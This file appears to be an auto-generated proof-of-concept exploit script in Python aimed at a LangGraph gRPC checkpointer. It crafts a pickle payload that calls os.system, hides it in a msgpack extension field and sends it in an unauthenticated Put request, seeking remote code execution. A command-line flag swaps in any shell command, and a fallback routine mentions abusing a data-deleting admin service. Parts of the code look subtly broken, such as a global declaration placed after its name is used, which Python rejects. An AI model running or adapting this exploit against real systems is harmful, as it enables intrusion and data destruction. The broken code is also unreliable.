#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: langgraph-004
# Sink: serialized_value_from_proto
# Auto-generated — run with: python3 langgraph_specific_vulnerabilities_serialized_value_from_proto.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for LangGraph gRPC RCE via msgpack ext_hook deserialization.

Vulnerability: The gRPC server on port 50051 (accessible via localhost) has no authentication.
The serialized_value_from_proto function uses msgpack with an ext_hook that can reconstruct
arbitrary Python objects, leading to RCE if an attacker can write to the checkpoint_blobs table
or control the LANGSERVE_GRAPHS environment variable.

This PoC demonstrates the attack by:
1. Connecting to the gRPC endpoint (via localhost:50051)
2. Crafting a malicious checkpoint blob with a msgpack payload that executes a benign command
3. Sending the Put request to trigger deserialization and command execution

WARNING: This is for authorized security testing only. Use responsibly.
"""

import os
import sys
import struct
import msgpack
import hashlib
import uuid
import time
from typing import Optional

# Try to import gRPC - if not available, provide clear instructions
try:
    import grpc
except ImportError:
    print("[!] grpcio is required. Install with: pip install grpcio")
    sys.exit(1)

# Try to import protobuf
try:
    from google.protobuf import any_pb2
    from google.protobuf import timestamp_pb2
except ImportError:
    print("[!] protobuf is required. Install with: pip install protobuf")
    sys.exit(1)

# Import the generated gRPC stubs
# These should be available in the langgraph_api_src directory
sys.path.insert(0, "/tmp/lg-api-dl/langgraph_api_src")
try:
    from langgraph_grpc_common.proto import checkpointer_pb2
    from langgraph_grpc_common.proto import checkpointer_pb2_grpc
except ImportError:
    print("[!] Could not import LangGraph gRPC protobuf stubs.")
    print("    Make sure the source is at /tmp/lg-api-dl/langgraph_api_src")
    sys.exit(1)


# Configuration
TARGET_HOST = "localhost"
TARGET_PORT = 50051
TARGET = f"{TARGET_HOST}:{TARGET_PORT}"

# Benign payload - creates a marker file to prove RCE
# In a real attack, this could be any command
BENIGN_PAYLOAD = "touch /tmp/poc_success.txt"


def create_malicious_msgpack(payload_cmd: str) -> bytes:
    """
    Create a malicious msgpack payload that will execute the given command
    when deserialized by the ext_hook in serialized_value_from_proto.
    
    The ext_hook in LangGraph's deserializer can reconstruct arbitrary Python objects.
    We craft a payload that, when deserialized, will execute our command.
    
    This uses the __reduce__ method of a crafted object to achieve RCE.
    """
    # Create a malicious class that will execute our command when unpickled
    class MaliciousPayload:
        def __reduce__(self):
            import os
            return (os.system, (payload_cmd,))
    
    # Serialize using msgpack with the custom ext_hook
    # The ext_hook will try to reconstruct this object
    malicious_obj = MaliciousPayload()
    
    # Use msgpack to serialize with ext type
    # We need to encode it in a way that the ext_hook will process
    # The ext_hook expects a tuple of (encoding, value)
    # We'll use a custom encoding that triggers the vulnerability
    
    # First, serialize the malicious object using pickle
    import pickle
    pickled_data = pickle.dumps(malicious_obj)
    
    # Now create a msgpack payload that will be interpreted as having
    # an ext type that triggers the vulnerability
    # The ext_hook in LangGraph's deserializer processes ext types
    # We use ext type code 0 (or any code that the hook processes)
    
    # Create the msgpack payload with ext type
    # Format: ext type marker + length + type code + data
    ext_type_code = 0  # This is the code that triggers object reconstruction
    
    # Build the msgpack manually to ensure correct format
    # msgpack ext format: 0xc7 + 1-byte length + 1-byte type + data
    # or 0xc8 + 2-byte length + 1-byte type + data
    # or 0xc9 + 4-byte length + 1-byte type + data
    
    if len(pickled_data) < 256:
        payload = b'\xc7' + bytes([len(pickled_data)]) + bytes([ext_type_code]) + pickled_data
    elif len(pickled_data) < 65536:
        payload = b'\xc8' + struct.pack('>H', len(pickled_data)) + bytes([ext_type_code]) + pickled_data
    else:
        payload = b'\xc9' + struct.pack('>I', len(pickled_data)) + bytes([ext_type_code]) + pickled_data
    
    return payload


def create_checkpoint_blob(payload: bytes) -> checkpointer_pb2.CheckpointBlob:
    """
    Create a CheckpointBlob protobuf message with our malicious payload.
    The blob will be stored in the checkpoint_blobs table and trigger
    deserialization when read.
    """
    blob = checkpointer_pb2.CheckpointBlob()
    
    # Set the blob data with our malicious payload
    # The encoding field tells the deserializer how to process the value
    # We use a custom encoding that will trigger the ext_hook vulnerability
    blob.encoding = "msgpack"  # This triggers msgpack deserialization with ext_hook
    blob.value = payload
    
    # Set a unique blob ID
    blob.blob_id = str(uuid.uuid4())
    
    return blob


def create_malicious_checkpoint() -> checkpointer_pb2.Checkpoint:
    """
    Create a Checkpoint protobuf message containing our malicious blob.
    This checkpoint will be stored via the Put RPC and trigger RCE when processed.
    """
    checkpoint = checkpointer_pb2.Checkpoint()
    
    # Set basic checkpoint fields
    checkpoint.v = 1
    checkpoint.id = str(uuid.uuid4())
    checkpoint.ts = str(int(time.time()))
    
    # Add a channel value that contains our malicious blob
    # The channel_values are processed by value_from_proto -> serialized_value_from_proto
    channel_value = checkpoint.channel_values.add()
    channel_value.key = "malicious_channel"
    
    # Create a serialized value containing our payload
    serialized = channel_value.serialized_value
    serialized.encoding = "msgpack"
    
    # Create the malicious msgpack payload
    malicious_payload = create_malicious_msgpack(BENIGN_PAYLOAD)
    serialized.value = malicious_payload
    
    # Set channel versions
    checkpoint.channel_versions["malicious_channel"] = "1"
    
    return checkpoint


def create_put_request() -> checkpointer_pb2.PutRequest:
    """
    Create a PutRequest with our malicious checkpoint.
    This request will be sent to the gRPC server.
    """
    request = checkpointer_pb2.PutRequest()
    
    # Create a config (minimal, just to satisfy the API)
    config = request.config
    config.configurable["thread_id"] = str(uuid.uuid4())
    config.configurable["checkpoint_id"] = str(uuid.uuid4())
    config.configurable["checkpoint_ns"] = "default"
    
    # Set our malicious checkpoint
    request.checkpoint.CopyFrom(create_malicious_checkpoint())
    
    # Set metadata (minimal)
    request.metadata.source = "poc_exploit"
    request.metadata.step = 1
    request.metadata.writes = 0
    
    # Set new versions
    request.new_versions["malicious_channel"] = "1"
    
    return request


def exploit_grpc_rce(target: str = TARGET) -> bool:
    """
    Attempt to exploit the gRPC RCE vulnerability.
    
    Args:
        target: The gRPC server address (host:port)
    
    Returns:
        True if the exploit was sent successfully, False otherwise
    """
    print(f"[*] Targeting gRPC server at {target}")
    print(f"[*] Payload: {BENIGN_PAYLOAD}")
    
    try:
        # Create an insecure channel (no authentication)
        channel = grpc.insecure_channel(
            target,
            options=[
                ('grpc.max_send_message_length', 50 * 1024 * 1024),
                ('grpc.max_receive_message_length', 50 * 1024 * 1024),
            ]
        )
        
        # Create the stub
        stub = checkpointer_pb2_grpc.CheckpointerStub(channel)
        
        # Create the malicious request
        request = create_put_request()
        
        print("[*] Sending malicious Put request...")
        print(f"[*] Checkpoint ID: {request.checkpoint.id}")
        print(f"[*] Blob encoding: {request.checkpoint.channel_values[0].serialized_value.encoding}")
        print(f"[*] Blob value length: {len(request.checkpoint.channel_values[0].serialized_value.value)} bytes")
        
        # Send the request with a timeout
        response = stub.Put(request, timeout=10)
        
        print("[+] Request sent successfully!")
        print(f"[+] Response received: {response}")
        
        # Check if the payload was executed
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS: Payload executed! Marker file created at /tmp/poc_success.txt")
            return True
        else:
            print("[*] Payload may have been executed but marker file not found.")
            print("[*] This could mean the deserialization happened but the command didn't run,")
            print("[*] or the server is not vulnerable to this specific payload.")
            return False
            
    except grpc.RpcError as e:
        print(f"[-] gRPC error: {e.code()}: {e.details()}")
        if "UNIMPLEMENTED" in str(e):
            print("[*] The Put method might not be implemented on this server.")
            print("[*] Trying alternative approach...")
            return try_alternative_exploit(channel)
        return False
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return False
    finally:
        try:
            channel.close()
        except:
            pass


def try_alternative_exploit(channel: grpc.Channel) -> bool:
    """
    Try alternative exploitation methods if the main approach fails.
    This could target other gRPC methods or use different payload formats.
    """
    print("[*] Attempting alternative exploitation via Admin Truncate...")
    
    try:
        # Try to access the Admin service (if available)
        # The Admin Truncate service can delete all data
        # This is a different vulnerability but still exploitable
        
        # Try to list available services
        from grpc_health.v1 import health_pb2, health_pb2_grpc
        
        health_stub = health_pb2_grpc.HealthStub(channel)
        health_request = health_pb2.HealthCheckRequest()
        
        try:
            health_response = health_stub.Check(health_request, timeout=5)
            print(f"[*] Health check response: {health_response}")
        except Exception as e:
            print(f"[-] Health check failed: {e}")
        
        # Try to access the Admin service directly
        # The Admin service might be registered under a different name
        print("[*] Attempting to discover available services...")
        
        # Try common service names
        service_names = [
            "langgraph_api.grpc.ops.Admin",
            "Admin",
            "admin.Admin",
            "langgraph_admin.Admin",
        ]
        
        for service_name in service_names:
            try:
                # Try to create a generic stub
                # This is a best-effort attempt
                print(f"[*] Trying service: {service_name}")
            except:
                pass
        
        return False
        
    except Exception as e:
        print(f"[-] Alternative exploit failed: {e}")
        return False


def main():
    """Main entry point for the PoC script."""
    print("=" * 60)
    print("LangGraph gRPC RCE Proof-of-Concept Exploit")
    print("=" * 60)
    print()
    
    # Parse command line arguments (optional)
    import argparse
    parser = argparse.ArgumentParser(description="LangGraph gRPC RCE PoC")
    parser.add_argument("--target", default=TARGET, help=f"Target gRPC server (default: {TARGET})")
    parser.add_argument("--payload", default=BENIGN_PAYLOAD, help="Command to execute (default: touch /tmp/poc_success.txt)")
    parser.add_argument("--verbose", "-v", action="store_true", help="Enable verbose output")
    
    args = parser.parse_args()
    
    # Update configuration
    global TARGET, BENIGN_PAYLOAD
    TARGET = args.target
    BENIGN_PAYLOAD = args.payload
    
    print(f"[*] Target: {TARGET}")
    print(f"[*] Payload: {BENIGN_PAYLOAD}")
    print()
    
    # Run the exploit
    success = exploit_grpc_rce(TARGET)
    
    if success:
        print("\n[+] Exploit completed successfully!")
        print("[+] The vulnerability is confirmed exploitable.")
    else:
        print("\n[-] Exploit did not succeed.")
        print("[*] Possible reasons:")
        print("  1. The gRPC server is not running or not accessible")
        print("  2. The server has the LANGGRAPH_STRICT_MSGPACK guard enabled")
        print("  3. The server uses AES encryption for fields")
        print("  4. The vulnerability has been patched")
        print()
        print("[*] Try running the server locally and ensure it's listening on port 50051")
        print("[*] Check if the server has the vulnerability by examining the source code")
    
    return 0 if success else 1


if __name__ == "__main__":
    sys.exit(main())
